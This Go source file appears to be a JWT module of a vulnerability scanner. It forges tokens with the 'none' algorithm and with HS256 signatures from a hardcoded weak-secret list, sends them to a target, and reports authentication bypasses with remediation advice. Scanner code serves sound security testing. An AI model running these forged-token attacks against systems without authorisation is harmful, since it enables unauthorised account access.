package modules

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"nightfalllx/pkg/client"
	"strings"
)

type JWTModule struct{}

func NewJWTModule() *JWTModule {
	return &JWTModule{}
}

func (m *JWTModule) Name() string {
	return "jwt"
}

func (m *JWTModule) Description() string {
	return "JSON Web Token (JWT) algorithm none & weak secret signature bypass analyzer"
}

var weakSecrets = []string{"secret", "password", "changeme", "key", "jwtsecret"}

func (m *JWTModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding

	// Find any JWT candidates in headers, bearer, cookie, or params
	var candidates []string
	if auth, ok := target.Headers["Authorization"]; ok && strings.HasPrefix(auth, "Bearer ") {
		candidates = append(candidates, strings.TrimPrefix(auth, "Bearer "))
	}
	if c.BearerToken != "" {
		candidates = append(candidates, c.BearerToken)
	}
	if c.Cookie != "" {
		for _, part := range strings.Split(c.Cookie, ";") {
			kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
			if len(kv) == 2 && strings.Count(kv[1], ".") == 2 {
				candidates = append(candidates, kv[1])
			}
		}
	}
	for _, v := range target.Params {
		if strings.Count(v, ".") == 2 {
			candidates = append(candidates, v)
		}
	}
	for _, v := range target.Data {
		if strings.Count(v, ".") == 2 {
			candidates = append(candidates, v)
		}
	}

	if len(candidates) == 0 {
		return nil, nil
	}

	// 1. Unauthenticated baseline check
	unauthHeaders := map[string]string{
		"Authorization": "",
	}
	unauthResp, err := c.Request(target.Method, target.URL, "", unauthHeaders)
	unauthStatus := 0
	if err == nil && unauthResp != nil {
		unauthStatus = unauthResp.StatusCode
	}

	for _, token := range candidates {
		parts := strings.Split(token, ".")
		if len(parts) != 3 {
			continue
		}

		// 2. Test "none" and "None" algorithm bypass
		noneAlgs := []string{"none", "None"}
		for _, algName := range noneAlgs {
			noneHeader := map[string]string{"alg": algName, "typ": "JWT"}
			noneHeaderBytes, _ := json.Marshal(noneHeader)
			noneHeaderB64 := base64.RawURLEncoding.EncodeToString(noneHeaderBytes)
			noneToken := fmt.Sprintf("%s.%s.", noneHeaderB64, parts[1])

			testHeaders := map[string]string{
				"Authorization": "Bearer " + noneToken,
			}
			resp, reqErr := c.Request(target.Method, target.URL, "", testHeaders)
			if reqErr == nil && resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 204) {
				// Confirm when protected path differs from unauthenticated response
				if unauthStatus == 401 || unauthStatus == 403 || unauthStatus == 302 || unauthStatus != resp.StatusCode {
					f := &Finding{
						Module:      m.Name(),
						Title:       fmt.Sprintf("JWT Algorithm '%s' Authentication Bypass", algName),
						Severity:    SeverityCritical,
						URL:         target.URL,
						Parameter:   "Authorization Header",
						Payload:     noneToken,
						Detail:      fmt.Sprintf("The application accepted a JWT with 'alg': '%s' and signature removed, successfully authenticating against a protected endpoint (unauthenticated status: %d).", algName, unauthStatus),
						Evidence:    fmt.Sprintf("Status %d received with forged '%s' token while unauthenticated returns %d", resp.StatusCode, algName, unauthStatus),
						Remediation: "Enforce strict algorithm whitelisting (e.g. RS256 or HS256). Explicitly reject 'none' algorithm.",
						CWEID:       347,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
					break
				}
			}
		}

		if len(findings) > 0 {
			break
		}

		// 3. Test weak HMAC-SHA256 secrets
		hs256Header := map[string]string{"alg": "HS256", "typ": "JWT"}
		hs256HeaderBytes, _ := json.Marshal(hs256Header)
		hs256HeaderB64 := base64.RawURLEncoding.EncodeToString(hs256HeaderBytes)
		unsignedToken := fmt.Sprintf("%s.%s", hs256HeaderB64, parts[1])

		for _, sec := range weakSecrets {
			mac := hmac.New(sha256.New, []byte(sec))
			mac.Write([]byte(unsignedToken))
			sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
			forgedToken := fmt.Sprintf("%s.%s", unsignedToken, sig)

			testHeaders := map[string]string{
				"Authorization": "Bearer " + forgedToken,
			}
			resp, reqErr := c.Request(target.Method, target.URL, "", testHeaders)
			if reqErr == nil && resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 204) {
				if unauthStatus == 401 || unauthStatus == 403 || unauthStatus == 302 || unauthStatus != resp.StatusCode {
					f := &Finding{
						Module:      m.Name(),
						Title:       "JWT Weak HMAC Secret Key Vulnerability",
						Severity:    SeverityHigh,
						URL:         target.URL,
						Parameter:   "Authorization Header",
						Payload:     fmt.Sprintf("Secret: '%s'", sec),
						Detail:      fmt.Sprintf("JWT signature was successfully validated using weak built-in secret '%s'.", sec),
						Evidence:    fmt.Sprintf("Status %d with forged HS256 token signed with secret '%s'", resp.StatusCode, sec),
						Remediation: "Use strong, cryptographically random HMAC secret keys with at least 256 bits of entropy or migrate to asymmetric keys (RS256).",
						CWEID:       522,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
					break
				}
			}
		}
	}

	return findings, nil
}
